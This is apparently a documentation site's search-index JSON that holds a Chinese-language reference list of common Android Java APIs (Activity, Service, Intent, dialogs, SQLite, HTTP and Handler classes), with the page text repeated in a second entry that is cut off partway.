{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hello","title":"Home"},{"location":"Android/JavaAndroid%E5%BC%80%E5%8F%91%E9%83%A8%E5%88%86API/","text":"JavaAndroid\u5f00\u53d1\u90e8\u5206API \u00b6 \u56db\u5927\u7ec4\u4ef6\uff0c\u90fd\u9700\u8981\u5728\u6e05\u5355\u6587\u4ef6\u4e2d\u914d\u7f6e Activity: \u7528\u6765\u63d0\u4f9b\u4e00\u4e2a\u80fd\u8ba9\u7528\u6237\u64cd\u4f5c\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u7684\u754c\u9762\u3000\u3000 onCreate(): \u81ea\u52a8\u8c03\u7528\u7684\u65b9\u6cd5, \u5728\u5176\u4e2d\u52a0\u8f7d\u5e03\u5c40\u663e\u793a\u3000\u3000\u3000\u3000 setContentView(int layoutId): \u52a0\u8f7d\u5e03\u5c40\u3000\u3000\u3000\u3000 View findViewById(int id): \u6839\u636eid\u627e\u5230\u5bf9\u5e94\u7684\u89c6\u56fe\u5bf9\u8c61\u3000\u3000\u3000\u3000 startActivity(Intent intent): \u4e00\u822c\u542f\u52a8Activity\u3000\u3000\u3000\u3000 startActivityForResult(int reqCode, Intent intent): \u5e26\u56de\u8c03\u542f\u52a8Activity\u3000\u3000\u3000\u3000 reqCode: \u8bf7\u6c42\u7801\u3000\u3000\u3000\u3000\u3000\u3000 onActivityResult(int reqCode, int resultCode, Intent data): \u56de\u8c03\u65b9\u6cd5(\u4f7f\u7528startActivityForResult\u65b9\u6cd5\u542f\u52a8\u7684Activity\u5173\u95ed\u65f6\u81ea\u52a8\u8c03\u7528)\uff0c\u9700\u91cd\u5199\u3000\u3000\u3000\u3000 reqCode: \u8bf7\u6c42\u7801\u3000\u3000\u3000\u3000\u3000\u3000 resultCode: \u8fd4\u56de\u7801\u3000\u3000\u3000\u3000\u3000\u3000 setResult(int resultCode, Intent data): \u5f53\u4f7f\u7528startActivityForResult\u65b9\u6cd5\u542f\u52a8\u7684activity\u65f6\uff0c\u8bbe\u7f6e\u8981\u8fd4\u56de\u7684\u7ed3\u679c\u3000\u3000\u3000\u3000\u3000\u3000 finish(): \u7ed3\u675f\u5f53\u524dActivity\u3000\u3000\u3000\u3000 getIntent(): \u5f97\u5230\u542f\u52a8Activity\u7684\u610f\u56fe\u3000\u3000\u3000\u3000 startService(Intent): \u5f00\u542f\u670d\u52a1\u3000\u3000\u3000\u3000 bindService(...): \u7ed1\u5b9a\u670d\u52a1\uff0c\u53ef\u4ee5\u8c03\u7528\u670d\u52a1\u4e2d\u7684\u65b9\u6cd5\u3000\u3000\u3000\u3000 getContentResolver(): \u83b7\u53d6\u7684\u7c7b\u53ef\u4ee5\u4f7f\u7528uri\u5bf9\u5176\u4ed6\u5e94\u7528\u5185\u5bb9\u63d0\u4f9b\u8005\u8fdb\u884c\u64cd\u4f5c\u3000\u3000\u3000\u3000 uri\u7684\u534f\u8bae\u4e3acontent\u3000\u3000\u3000\u3000\u3000\u3000 \u8def\u5f84:\u3000\u3000\u3000\u3000 getFileDir(): \u83b7\u53d6\u6587\u4ef6\u4fdd\u5b58\u76ee\u5f55\u3000\u3000\u3000\u3000\u3000\u3000 getCacheDir(): \u83b7\u53d6\u7f13\u5b58\u76ee\u5f55\u3000\u3000\u3000\u3000\u3000\u3000 openFileOutput(String, int): \u62ff\u5230File\u76ee\u5f55\u6587\u4ef6\u7684\u8f93\u51fa\u6d41\u3000\u3000\u3000\u3000\u3000\u3000 openFileInput(String, int): \u62ff\u5230File\u76ee\u5f55\u6587\u4ef6\u7684\u8f93\u5165\u6d41\u3000\u3000\u3000\u3000\u3000\u3000 runOnUiThread(Runnable): \u53ef\u5728\u5b50\u7ebf\u7a0b\u4e2d\u8c03\u7528\uff0c\u5b8c\u6210\u66f4\u65b0ui\u64cd\u4f5c\u3000\u3000\u3000\u3000 \u751f\u547d\u5468\u671f\u65b9\u6cd5: onCreate(),onStart(),onResume(),onPause(),onRestart(),onStop(),onDestory()\u3000\u3000\u3000\u3000 BroadcastReceiver: \u5e7f\u64ad\u63a5\u6536\u8005,\u53ef\u76d1\u542c\u624b\u673a\u7684\u72b6\u6001\u3000\u3000 onReceive(Context, Intent): \u5f53\u63a5\u6536\u5230\u4e8b\u4ef6\u65f6\u8c03\u7528\uff0c\u76d1\u542c\u7684\u4e8b\u4ef6\u5728\u6e05\u5355\u6587\u4ef6\u4e2d\u914d\u7f6e\u3000\u3000\u3000\u3000 Intent.getAction(): \u83b7\u53d6\u4e8b\u4ef6\u7c7b\u578b\u3000\u3000\u3000\u3000\u3000\u3000 Service: \u670d\u52a1\u3000\u3000 onBind(): \u5f53\u7ed1\u5b9a\u670d\u52a1\u65f6\u8c03\u7528,\u4f7f\u7528\u8fd4\u56de\u7684\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u670d\u52a1\u4e2d\u7684\u5bf9\u8c61\u3000\u3000\u3000\u3000 onCreate(): \u7b2c\u4e00\u6b21\u521b\u5efa\u670d\u52a1\u65f6\u8c03\u7528\u3000\u3000\u3000\u3000 onStartCommand(..): \u6bcf\u6b21start\u670d\u52a1\u65f6\u8c03\u7528\u3000\u3000\u3000\u3000 onDestroy(): \u505c\u6b62\u670d\u52a1\u65f6\u8c03\u7528\u3000\u3000\u3000\u3000 ContentProvider\uff1a\u5185\u5bb9\u63d0\u4f9b\u8005\uff0c\u53ef\u4ee5\u8ba9\u5176\u4ed6\u5e94\u7528\u8bbf\u95ee\u81ea\u5df1\u7684\u6570\u636e\u5e93\u3000\u3000 UriMatcher\uff1a\u5339\u914duri\u7684\u7c7b\u3000\u3000\u3000\u3000 new UriMatcher(UriMatcher.NO_MATCH)\uff1a \u521b\u5efa\u3000\u3000\u3000\u3000\u3000\u3000 UriMatcher.addURI(String authorities, String path, int): \u6dfb\u52a0\u5339\u914d\u8def\u5f84\uff0c\u5728\u6570\u636e\u5e93\u64cd\u4f5c\u65b9\u6cd5\u4e2d\u4f7f\u7528UriMatcher.match(uri)\u65b9\u6cd5\u8fdb\u884c\u8fd4\u56de\u7801\u5224\u65ad\u8def\u5f84\u3000\u3000\u3000\u3000\u3000\u3000 authorities: \u6e05\u5355\u6587\u4ef6\u4e2d\u7684authorities\u5c5e\u6027\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 path: \u8bf7\u6c42\u8def\u5f84\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 int: \u8bf7\u6c42\u7801\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 R: \u5e94\u7528\u7684\u8d44\u6e90\u7c7b\u3000\u3000 R.drawable: \u5305\u542b\u6240\u6709\u56fe\u7247\u8d44\u6e90\u6807\u8bc6\u7684\u5185\u90e8\u7c7b\u3000\u3000 R.layout: \u5305\u542b\u6240\u6709\u5e03\u5c40\u8d44\u6e90\u6807\u8bc6\u7684\u5185\u90e8\u7c7b\u3000\u3000 R.id: \u5305\u542b\u6240\u6709\u89c6\u56feid\u6807\u8bc6\u7684\u5185\u90e8\u7c7b\u3000\u3000 R.string: \u5305\u542b\u6240\u6709\u5b57\u7b26\u4e32\u6807\u8bc6\u7684\u5185\u90e8\u7c7b\u3000\u3000 Intent: Activity, Service\u548cBroadcastReceiver\u8fd9\u4e09\u4e2a\u5e94\u7528\u7ec4\u4ef6\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u7684\u4fe1\u4f7f Intent(Context context, Class clazz): \u660e\u786e\u6307\u5b9a\u7684\u76ee\u6807\u7ec4\u4ef6\u7684\u610f\u56fe,\u5f53\u64cd\u4f5c\u5f53\u524d\u81ea\u5df1\u5e94\u7528\u7684\u7ec4\u4ef6\u65f6\u4f7f\u7528\u3000\u3000 Intent(String action): \u6ca1\u6709\u660e\u786e\u6307\u5b9a\u76ee\u6807\u7ec4\u4ef6\u7684\u610f\u56fe,\u5f53\u64cd\u4f5c\u5176\u5b83\u5e94\u7528\u7684\u7ec4\u4ef6\u65f6\u4f7f\u7528\u3000\u3000 action: \u4e3aActivity\u914d\u7f6e\u4e2d\u7684 \u6807\u7b7e\u4e2d \u6807\u7b7e\u7684android:name\u5c5e\u6027\u3000\u3000\u3000\u3000 Intent.ACTION_DIAL: \u8fdb\u5165\u7535\u8bdd\u62e8\u6253\u754c\u9762\u7684\u610f\u56fe\u3000\u3000\u3000\u3000\u3000\u3000 Intent.ACTION_SENDTO: \u8fdb\u5165\u77ed\u4fe1\u7f16\u8f91\u754c\u9762\u7684\u610f\u56fe\u3000\u3000\u3000\u3000\u3000\u3000 Intent.ACTION_CALL: \u62e8\u6253\u7535\u8bdd\u7684\u610f\u56fe\u3000\u3000\u3000\u3000\u3000\u3000 putExtra(String name, Xxx value): \u4fdd\u5b58\u989d\u5916\u6570\u636e\u3000\u3000 Xxx getXxxExtra(String name): \u83b7\u53d6\u989d\u5916\u6570\u636e\u3000\u3000 setData(Uri data): \u8bbe\u7f6e\u6709\u7279\u5b9a\u683c\u5f0f\u7684uri\u6570\u636e\u3000\u3000 View: \u6240\u6709\u89c6\u56fe\u7684\u6839\u57fa\u7c7b setonClickListener(OnClickListener listener): \u7ed9\u89c6\u56fe\u8bbe\u7f6e\u70b9\u51fb\u76d1\u542c\u3000\u3000 setOnLongClickListener(OnLongListener listener): \u8bbe\u7f6e\u957f\u6309\u76d1\u542c\u3000\u3000 void setVisibility(int visibility): \u8bbe\u7f6e\u8bd5\u56fe\u7684\u53ef\u89c1\u6027\u3000\u3000 visibility:\u3000\u3000\u3000\u3000 View.VISIBLE: \u53ef\u89c1\u3000\u3000\u3000\u3000\u3000\u3000 View.INVISIBLE: \u4e0d\u53ef\u89c1\uff0c\u4f46\u5360\u7528\u5c4f\u5e55\u7a7a\u95f4\u3000\u3000\u3000\u3000\u3000\u3000 View.GONE: \u4e0d\u53ef\u89c1\uff0c\u4e5f\u4e0d\u5360\u7528\u5c4f\u5e55\u7a7a\u95f4\u3000\u3000\u3000\u3000\u3000\u3000 static View inflate(Context context, int resource, ViewGroup root): \u52a8\u6001\u52a0\u8f7d\u5e03\u5c40\u6587\u4ef6\u3000\u3000 \u52a8\u6001\u52a0\u8f7d\u5e03\u5c40\u6587\u4ef6\u7684\u5176\u4ed6\u4e24\u79cd\u65b9\u6cd5\u3000\u3000\u3000\u3000 LayoutInflater.from(Context).inflate(int, ViewGroup);\u3000\u3000\u3000\u3000\u3000\u3000 LayoutInflater inflater = getSystemService(LAYOUT_INFLATER_SERVICE); inflater.inflater(int, ViewGroup);\u3000\u3000\u3000\u3000\u3000\u3000 Toast: \u7528\u6765\u663e\u793a\u77ed\u65f6\u95f4\u63d0\u793a\u6587\u672c\u7684\u7c7b static Toast makeText(Context context, CharSequence text, int duration) : \u521b\u5efa\u4e00\u4e2atoast\u5bf9\u8c61\u3000\u3000 context: \u53ef\u4ee5\u4f20\u5165Activity\u7c7b\u3000\u3000\u3000\u3000 text: \u663e\u793a\u7684\u6587\u672c\u3000\u3000\u3000\u3000 duration: \u6301\u7eed\u7684\u65f6\u95f4(LENGTH_SHORT\u6216LENGTH_LONG)\u3000\u3000\u3000\u3000 show(): \u663e\u793a\u63d0\u793a\u3000\u3000 AlertDialog: \u663e\u793a\u5728\u5c4f\u5e55\u4e0a\u7684\u5c0f\u5bf9\u8bdd\u6846 show(): \u663e\u793a\u3000\u3000 AlertDialog.Builder: AlertDialog\u5185\u90e8\u7c7b\uff0c\u7528\u6765\u521b\u5efaAlertDialog\u3000\u3000 create(): \u521b\u5efaAlertDialog\u5bf9\u8c61\u3000\u3000\u3000\u3000 show(): \u521b\u5efaalertDialog\u5bf9\u8c61\uff0c\u540c\u65f6\u5c06\u5176\u663e\u793a\u51fa\u6765\u3000\u3000\u3000\u3000 setTitle(CharSequence): \u8bbe\u7f6e\u6807\u9898\u3000\u3000\u3000\u3000 setMessage(CharSequence): \u8bbe\u7f6e\u5185\u5bb9\u3000\u3000\u3000\u3000 setPositiveButton(String, OnClickListener): \u8bbe\u7f6e\u6b63\u9762\u6309\u94ae\u3000\u3000\u3000\u3000 setNegativeButton(String, OnClickListener): \u8bbe\u7f6e\u8d1f\u9762\u6309\u94ae\u3000\u3000\u3000\u3000 dismiss(): \u79fb\u9664dialog\u3000\u3000\u3000\u3000 setView(View): \u8bbe\u7f6edialog\u4e2d\u7684\u5e03\u5c40\u3000\u3000\u3000\u3000 setSingleChoiceItems(CharSequence[], int, OnClickListener): \u8bbe\u7f6e\u5355\u9009\u5217\u8868\u3000\u3000\u3000\u3000 setMultiChoiceItems(...): \u8bbe\u7f6e\u591a\u9009\u5217\u8868\u3000\u3000\u3000\u3000 ProgressDialog: \u8fdb\u5ea6\u6846\u3000\u3000 show(Context, CharSequence, CharSequence): \u50cf\u662fdialog\u3000\u3000 setProgressStyle(int style): \u8bbe\u7f6e\u6837\u5f0f\u3000\u3000 style: \u6837\u5f0f\uff0c\u9ed8\u8ba4\u5706\u5f62\u8fdb\u5ea6\u3000\u3000\u3000\u3000 ProgressDialog.STYLE_HORIZONTAL: \u6c34\u5e73\u8fdb\u5ea6\u6761\u6837\u5f0f\u3000\u3000\u3000\u3000\u3000\u3000 dismiss(): \u79fb\u9664dialog\u3000\u3000 SmsManager: \u53d1\u9001\u77ed\u4fe1\u7684\u5de5\u5177\u7c7b static SmsManager getDefault() : \u5f97\u5230\u5f53\u524d\u5bf9\u8c61\u3000\u3000 sendTextMessage(String destinationAddress, String scAddress, String text, PendingIntent sentIntent, PendingIntent deliveryIntent): \u53d1\u9001\u77ed\u4fe1\u3000\u3000 destinationAddress\uff1a\u7535\u8bdd\u53f7\u7801\u3000\u3000\u3000\u3000 scAddress\uff1a\u670d\u52a1\u4e2d\u5fc3\u7684\u5730\u5740\uff0c\u4e00\u822c\u586bnull\u3000\u3000\u3000\u3000 text\uff1a\u4fe1\u606f\u5185\u5bb9\u3000\u3000\u3000\u3000 sentIntent\u3000\u3000\u3000\u3000 deliveryIntent\u3000\u3000\u3000\u3000 SharedPreferences: \u7528\u4e8e\u4fdd\u5b58\u6570\u636e\u7684\u7c7b Activity.getSharedPreferences(String, int): \u62ff\u5230SharedPreferences\u3000\u3000 Editor edit(): \u62ff\u5230\u7f16\u8f91\u5668\u3000\u3000 Editor:\u3000\u3000\u3000\u3000 putXxx(...): \u5411\u7f16\u8f91\u5668\u4e2d\u653e\u6570\u636e\u3000\u3000\u3000\u3000\u3000\u3000 getXxx(...): \u53d6\u51fa\u6570\u636e\u3000\u3000 commit(): \u63d0\u4ea4\u6570\u636e\uff0c\u4fdd\u5b58\u6570\u636e\u3000\u3000 OptionMenu: \u5e95\u90e8\u83dc\u5355 \u5728activity\u4e2d\u91cd\u5199onCreateOptionsMenu\u65b9\u6cd5\uff0c\u5373\u53ef\u5b9a\u4e49\u5e95\u90e8\u83dc\u5355\u3000\u3000 \u5411menu\u4e2d\u6dfb\u52a0menultem\u7684\u65b9\u5f0f\u3000\u3000 \u8c03\u7528menu.add(...)\u65b9\u6cd5\u3000\u3000\u3000\u3000 \u52a0\u8f7dmenu\u6587\u4ef6\u3000\u3000\u3000\u3000 getMenulnflater().inflate(R.menu.main_option, menu);\u3000\u3000\u3000\u3000\u3000\u3000 \u91cd\u5199onOptionsItemSelected\u65b9\u6cd5\uff0c\u8fdb\u884c\u76f8\u5e94\u3000\u3000 ContextMenu: \u4e0a\u4e0b\u6587\u83dc\u5355 setOnCreateContextMenuListener(listener)\uff1a\u4e3a\u67d0\u4e2a\u89c6\u56fe\u6dfb\u52a0\u521b\u5efaContextMenu\u7684\u76d1\u542c(\u9700\u8981\u957f\u6309\u89e6\u53d1)\u3000\u3000 onCreateContextMenu(menu, view, menuInfo)\uff1a\u5b9a\u4e49\u4e0a\u4e0b\u6587\u83dc\u5355\u3000\u3000 \u5411menu\u4e2d\u6dfb\u52a0menultem\u7684\u65b9\u5f0f\uff0c\u540c\u4e0a\u3000\u3000\u3000\u3000 onContextItemSelected(MenuItem item)\u5f53\u9009\u62e9\u67d0\u4e2a\u83dc\u5355\u9879\u7684\u56de\u8c03\u65b9\u6cd5 XmlSerializer: \u5199xml\u6587\u4ef6\u7c7b\uff0c\u4f7f\u7528Xml\u7c7b\u62ff\u5230 setOutput(OutputStream, String): \u6307\u5b9a\u8f93\u51fa\u6d41\u53ca\u7f16\u7801\u3000\u3000 startDocument(String, Boolean): \u5199xml\u6587\u4ef6\u7684\u5f00\u5934\u3000\u3000 endDocument(): \u5199xml\u6587\u4ef6\u7684\u7ed3\u5c3e\u3000\u3000 startTag(String, String): \u5199\u8282\u70b9\u3000\u3000 endTag(String, String): \u7ed3\u675f\u8282\u70b9\u3000\u3000 text(String): \u5199\u6807\u7b7e\u4f53\u3000\u3000 XmlPullParser: \u8bfbxml\u6587\u4ef6\uff0c\u4f7f\u7528Xml\u7c7b\u62ff\u5230 setInput(InputStream, String): \u6307\u5b9a\u8f93\u5165\u6d41\u53ca\u7f16\u7801\u3000\u3000 getEventType(): \u62ff\u5230\u5f53\u524d\u4e8b\u4ef6\u7c7b\u578b\u3000\u3000 START_TAG\uff1b\u5f00\u59cb\u6807\u7b7e\u3000\u3000\u3000\u3000 TEXT: \u6587\u672c\u5185\u5bb9\u3000\u3000\u3000\u3000 END_TAG: \u7ed3\u675f\u6807\u7b7e\u3000\u3000\u3000\u3000 END_DOCUMENT: \u6587\u4ef6\u7ed3\u5c3e\u3000\u3000\u3000\u3000 next(): \u5411\u540e\u79fb\u52a8\uff0c\u5e76\u8fd4\u56de\u79fb\u52a8\u540e\u7684\u4e8b\u4ef6\u7c7b\u578b\u3000\u3000 getName(): \u62ff\u5230\u5f53\u524d\u7684\u5f00\u59cb\u6807\u7b7e\u6216\u7ed3\u675f\u6807\u7b7e\u7684\u540d\u5b57\u3000\u3000 getAttributeValue(int): \u62ff\u5230\u5c5e\u6027\u503c\u3000\u3000 nextText(): \u5f53\u524d\u4e3a\u5f00\u59cb\u6807\u7b7e\u65f6\uff0c\u62ff\u5230\u6807\u7b7e\u4f53\u5185\u5bb9\u3000\u3000 Xml\uff1axml\u6587\u4ef6\u6709\u5173\u7684\u5de5\u5177\u7c7b newSerializer(): \u65b0\u5efa\u4e00\u4e2aXmlSerializer\u7c7b\u3000\u3000 newPullParser(): \u65b0\u5efa\u4e00\u4e2aXmlPullParser\u7c7b\u3000\u3000 SQLiteOpenHelper\uff1a\u4f7f\u7528\u6570\u636e\u5e93\u4f7f\u7528\u7684\u7c7b\uff0c\u62bd\u8c61\u7c7b\uff0c\u9700\u81ea\u5df1\u5b9e\u73b0\uff0c\u6570\u636e\u5e93\u4ee5db\u4e3a\u540e\u7f00 SQLiteOpenHelper(Context, String, CursorFactory, int): \u6784\u9020\u5668\uff0c\u53c2\u6570(\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u6570\u636e\u5e93\u540d\u79f0\uff0cnull,\u7248\u672c)\u3000\u3000 onCreate(SQLiteDatabase): \u9700\u91cd\u5199\uff0c\u5f53\u6570\u636e\u5e93\u521b\u5efa\u65f6\u8c03\u7528(\u521b\u5efa\u8868)\u3000\u3000 onUpgrade(SQLiteDatabase, int, int):\u9700\u91cd\u5199\uff0c\u5f53\u6570\u636e\u5e93\u7248\u672c\u5347\u7ea7\u65f6\u8c03\u7528\u3000\u3000 getWritableDatabase(): \u62ff\u5230SQLiteDatabase\u5bf9\u8c61\u3000\u3000 getReadableDatabase(): \u62ff\u5230SQLiteDatabase\u5bf9\u8c61\uff0c\u5f53\u78c1\u76d8\u6ee1\u4e86\uff0c\u8fd4\u56de\u53ea\u8bfb\u7684 SQLiteDatabase: \u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\u7684\u7c7b execSQL(String, [Object[]]): \u6267\u884csql\u8bed\u53e5\uff0csql\u8bed\u53e5\u6709\u5360\u4f4d\u7b26\u65f6\u4f7f\u7528obj\u6570\u7ec4\u3000\u3000 rawQuery(String, String[]): \u4f7f\u7528sql\u8bed\u53e5\u67e5\u8be2\uff0c\u8fd4\u56deCursor\u7ed3\u679c\u96c6\u3000\u3000 insert(String, String, ContentValues): \u5411\u6570\u636e\u5e93\u6dfb\u52a0\u7eaa\u5f55(\u8868\u540d\uff0cnull\uff0cmap)\u3000\u3000 delete(String, String, String[]): \u5220\u9664\u6570\u636e(\u8868\u540d\uff0c\u6761\u4ef6\uff0c\u5360\u4f4d\u7b26)\u3000\u3000 update(String, ContentValues, String, String[]): \u66f4\u65b0\u6570\u636e(\u8868\u540d\uff0cmap\uff0c\u6761\u4ef6\uff0c\u5360\u4f4d\u7b26)\u3000\u3000 query(...): \u67e5\u8be2\u6570\u636e\u5e93\uff0c\u8fd4\u56deCursor\u5bf9\u8c61\u3000\u3000 close(): \u5173\u95ed\u6570\u636e\u5e93\u3000\u3000 beginTransaction(): \u5f00\u542f\u4e8b\u52a1\u3000\u3000 endTransaction(): \u5173\u95ed\u4e8b\u52a1\u3000\u3000 setTransactionSuccessful(): \u8bbe\u7f6e\u4e8b\u52a1\u6210\u529f\uff0c\u5373\u63d0\u4ea4\u4e8b\u52a1\u3000\u3000 Cursor: \u6570\u636e\u5e93\u67e5\u8be2\u7684\u7ed3\u679c\u96c6 getCount(): \u8fd4\u56de\u7ed3\u679c\u6570\u3000\u3000 getColunCount(): \u8fd4\u56de\u7ed3\u679c\u5217\u6570\u3000\u3000 getColumnNames(): \u8fd4\u56de\u5217\u540d\u7684\u6570\u7ec4\u3000\u3000 getXxx(int): \u62ff\u5230\u5f53\u524d\u884c\u7684\u5bf9\u5e94\u5217\u7684\u503c(0\u5f00\u59cb)\u3000\u3000 moveToFirst(): \u79fb\u52a8\u5230\u7b2c\u4e00\u4e2a\u7ed3\u679c\u3000\u3000 moveToLast(): \u79fb\u52a8\u5230\u6700\u540e\u4e00\u4e2a\u3000\u3000 moveToNext(): \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u3000\u3000 close(): \u5173\u95ed\u3000\u3000 ArrayAdapter: ListAdapter\u5b50\u7c7b\uff0c\u5411ListView\u4e2d\u6dfb\u52a0\u9879\uff0c\u53ea\u80fd\u6dfb\u52a0\u4e00\u4e2a\u7ec4\u4ef6 SimpleAdapter: ListAdapter\u5b50\u7c7b\uff0c\u5411ListView\u4e2d\u6dfb\u52a0\u9879\uff0c\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u7ec4\u4ef6\uff0c\u8017\u5185\u5b58 SimpleAdapter(Context, List >, int, String[], int[]): \u53c2\u6570(\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u9700\u8981\u663e\u793a\u7684\u6570\u636eList\uff0c\u5e03\u5c40\u6587\u4ef6\u6807\u8bc6\uff0cmap\u7684key\u7684\u6570\u7ec4\uff0c\u5e03\u5c40\u6587\u4ef6\u4e2d\u5b50View\u7684id\u6570\u7ec4)\u3000\u3000 BaseAdapter: ListAdapter\u5b50\u7c7b\uff0c\u5411ListView\u4e2d\u6dfb\u52a0\u9879\uff0c \u62bd\u8c61\u7c7b\uff0c\u9700\u81ea\u5df1\u5b9e\u73b0\uff0cArrayAdapter\u548cSimpleAdapter\u5747\u662f\u5176\u5b9e\u73b0\u7c7b\u3000\u3000 getCount(): \u8fd4\u56de\u96c6\u5408\u6570\u636e\u7684\u6570\u91cf\u3000\u3000 getItem(int): \u8fd4\u56de\u6307\u5b9a\u4e0b\u6807\u5bf9\u5e94\u7684\u6570\u636e\u5bf9\u8c61\u3000\u3000 getView(int, View, ViewGroup): \u8fd4\u56de\u6307\u5b9a\u4e0b\u6807item\u7684View\u5bf9\u8c61\u3000\u3000 HttpURLConnection: \u4f7f\u7528Http\u534f\u8bae\u53d1\u9001\u548c\u63a5\u6536\u6570\u636e \u4f7f\u7528URL\u7c7b\u521b\u5efa\u3000\u3000 setConnectTimeout(int): \u8bbe\u7f6e\u94fe\u63a5\u7684\u8d85\u65f6\u65f6\u95f4\u3000\u3000 setRequestMethod(String): \u8bbe\u7f6e\u8bf7\u6c42\u7c7b\u578b\u3000\u3000 setRequestProperty(String, String): \u8bbe\u7f6e\u8bf7\u6c42\u5934\u4fe1\u606f\u3000\u3000 Post\u63d0\u4ea4\u65f6\u9700\u8981\u8bbe\u7f6e\"Content-Type\"\u548cContent-Length\"\u5934\u4fe1\u606f\u3000\u3000\u3000\u3000\u3000\u3000 setDoOupput(boolean): \u8bbe\u7f6e\u5141\u8bb8\u8f93\u51fa\u64cd\u4f5c\uff0c\u5728post\u8bf7\u6c42\u65f6\u4f7f\u7528\u3000\u3000 getOupputStream(): \u62ff\u5230\u8f93\u51fa\u6d41\uff0c\u5728post\u8bf7\u6c42\u65f6\u5199\u5165\u8bf7\u6c42\u4f53\u3000\u3000 getResponseCode(): \u83b7\u53d6\u54cd\u5e94\u7801\u3000\u3000 getInputStream(): \u83b7\u53d6\u670d\u52a1\u5668\u54cd\u5e94\u4fe1\u606f\u7684\u8f93\u5165\u6d41 HttpClient: \u5b89\u5353\u63d0\u4f9b\u7684\u8054\u7f51\u7c7b \u5b9e\u73b0\u7c7b: DefaultHttpClient...\u3000\u3000 execute(HttpUriRequest): \u6267\u884curl\u8bf7\u6c42\uff0c\u8fd4\u56deHttpResponse\u5bf9\u8c61\u3000\u3000 HttpUriRequest\u3000\u3000\u3000\u3000 \u5b9e\u73b0\u7c7b: HttpGet, HttpPost...\u3000\u3000\u3000\u3000\u3000\u3000 HttpResponse:\u3000\u3000\u3000\u3000 getStatusLine().getStatusCode(): \u83b7\u53d6\u54cd\u5e94\u7801\u3000\u3000\u3000\u3000\u3000\u3000 getEntity().getContent(): \u83b7\u53d6\u76f8\u5e94\u6d41\u3000\u3000\u3000\u3000\u3000\u3000 URL: URL(String): \u4f7f\u7528\u6307\u5b9a\u8def\u5f84\u521b\u5efaURL\u5bf9\u8c61\u3000\u3000 openConnection(): \u6253\u5f00\u94fe\u63a5\uff0c\u5f97\u5230URLConnection\u5bf9\u8c61\u3000\u3000 Handler: \u53ef\u4ee5\u6267\u884c\u66f4\u65b0ui\u64cd\u4f5c\u7684\u7ebf\u7a0b \u5728\u5206\u7ebf\u7a0b\u4e2d\u8c03\u7528handler.sendMessage(Message),\u8fdb\u884c\u66f4\u65b0ui\u64cd\u4f5c\u3000\u3000 handleMessage(Message): \u9700\u91cd\u5199\uff0c\u5f53sendMessage()\u8c03\u7528\u65f6\u6267\u884c\u6b64\u65b9\u6cd5\u3000\u3000 postDelayed(Runnable, int): \u5728\u6307\u5b9a\u65f6\u95f4\u540e\u6267\u884c\u64cd\u4f5c","title":"[JavaAndroid\u5f00\u53d1\u90e8\u5206API](https://www.cnblogs.com/hujingnb/p/10282197.html)"},{"location":"Android/JavaAndroid%E5%BC%80%E5%8F%91%E9%83%A8%E5%88%86API/#javaandroidapi","text":"\u56db\u5927\u7ec4\u4ef6\uff0c\u90fd\u9700\u8981\u5728\u6e05\u5355\u6587\u4ef6\u4e2d\u914d\u7f6e Activity: \u7528\u6765\u63d0\u4f9b\u4e00\u4e2a\u80fd\u8ba9\u7528\u6237\u64cd\u4f5c\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u7684\u754c\u9762\u3000\u3000 onCreate(): \u81ea\u52a8\u8c03\u7528\u7684\u65b9\u6cd5, \u5728\u5176\u4e2d\u52a0\u8f7d\u5e03\u5c40\u663e\u793a\u3000\u3000\u3000\u3000 setContentView(int layoutId): \u52a0\u8f7d\u5e03\u5c40\u3000\u3000\u3000\u3000 View findViewById(int id): \u6839\u636eid\u627e\u5230\u5bf9\u5e94\u7684\u89c6\u56fe\u5bf9\u8c61\u3000\u3000\u3000\u3000 startActivity(Intent intent): \u4e00\u822c\u542f\u52a8Activity\u3000\u3000\u3000\u3000 startActivityForResult(int reqCode, Intent intent): \u5e26\u56de\u8c03\u542f\u52a8Activity\u3000\u3000\u3000\u3000 reqCode: \u8bf7\u6c42\u7801\u3000\u3000\u3000\u3000\u3000\u3000 onActivityResult(int reqCode, int resultCode, Intent data): \u56de\u8c03\u65b9\u6cd5(\u4f7f\u7528startActivityForResult\u65b9\u6cd5\u542f\u52a8\u7684Activity\u5173\u95ed\u65f6\u81ea\u52a8\u8c03\u7528)\uff0c\u9700\u91cd\u5199\u3000\u3000\u3000\u3000 reqCode: \u8bf7\u6c42\u7801\u3000\u3000\u3000\u3000\u3000\u3000 resultCode: \u8fd4\u56de\u7801\u3000\u3000\u3000\u3000\u3000\u3000 setResult(int resultCode, Intent data): \u5f53\u4f7f\u7528startActivityForResult\u65b9\u6cd5\u542f\u52a8\u7684activity\u65f6\uff0c\u8bbe\u7f6e\u8981\u8fd4\u56de\u7684\u7ed3\u679c\u3000\u3000\u3000\u3000\u3000\u3000 finish(): \u7ed3\u675f\u5f53\u524dActivity\u3000\u3000\u3000\u3000 getIntent(): \u5f97\u5230\u542f\u52a8Activity\u7684\u610f\u56fe\u3000\u3000\u3000\u3000 startService(Intent): \u5f00\u542f\u670d\u52a1\u3000\u3000\u3000\u3000 bindService(...): \u7ed1\u5b9a\u670d\u52a1\uff0c\u53ef\u4ee5\u8c03\u7528\u670d\u52a1\u4e2d\u7684\u65b9\u6cd5\u3000\u3000\u3000\u3000 getContentResolver(): \u83b7\u53d6\u7684\u7c7b\u53ef\u4ee5\u4f7f\u7528uri\u5bf9\u5176\u4ed6\u5e94\u7528\u5185\u5bb9\u63d0\u4f9b\u8005\u8fdb\u884c\u64cd\u4f5c\u3000\u3000\u3000\u3000 uri\u7684\u534f\u8bae\u4e3acontent\u3000\u3000\u3000\u3000\u3000\u3000 \u8def\u5f84:\u3000\u3000\u3000\u3000 getFileDir(): 